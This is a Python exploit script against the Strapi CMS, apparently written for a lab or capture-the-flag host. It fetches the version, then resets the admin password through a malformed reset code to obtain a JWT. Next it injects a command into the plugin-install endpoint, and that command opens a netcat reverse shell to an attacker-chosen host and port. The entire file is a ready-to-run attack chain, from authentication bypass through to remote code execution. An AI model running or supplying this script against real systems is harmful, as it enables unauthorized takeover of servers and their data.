import requests
import sys
import json
import jwt
if len(sys.argv)<4:
    print("Hello dummy, read the script")
    print("Usage: python3 "+sys.argv[0]+" LHOST LPORT URL")
    print("Example: python3 "+ sys.argv[0]+" 192.168.3.22 443 http://prod.fetchurls.com")
    sys.exit(1)
lhost = sys.argv[1]
lport = sys.argv[2]
url = sys.argv[3]
updated_pass = "TeamSESHandIwantToRest"
r = requests.session()
print("* [+] * Attempting to grab the version")
res_version = r.get(url+'/admin/strapiVersion')
if res_version.ok: 
    print(f'Current Version is: {res_version.json().get("strapiVersion")}')
else: 
    print("Unable to find the page, example for final page: http://prod.fetchurls.com/admin/strapiVersion." + str(res_version.status_code))
    sys.exit()
url_reset = url+'/admin/auth/reset-password'
data = {
    "code":{},
    "password":updated_pass, 
    "passwordConfirmation":updated_pass,
}
print("* [+] * Updated the pass to " + updated_pass)
resp = r.post(url_reset, json=data).text
save_var = json.loads(resp)
if "jwt" not in save_var: 
    print("Failed to get JWT back")
else:
    saved_jwt = save_var['jwt']
print("Found JWT: " + saved_jwt)
virtual_host = url.replace('http://', '') # removing the http:// from the url, final result should be like: prod.fetchurls.com instead of http://prod.fetchurls.com
send_header = {
    'Host': virtual_host,
    'Authorization': "Bearer " + saved_jwt,
    'Content-Type': 'application/json',
}
payload_exp = '{"plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %s >/tmp/f)"}' % (lhost, lport) 
applying_exp = r.post(
    url+'/admin/plugins/install',
    headers=send_header,
    data=payload_exp, 
    verify=False
)
print(applying_exp.text)
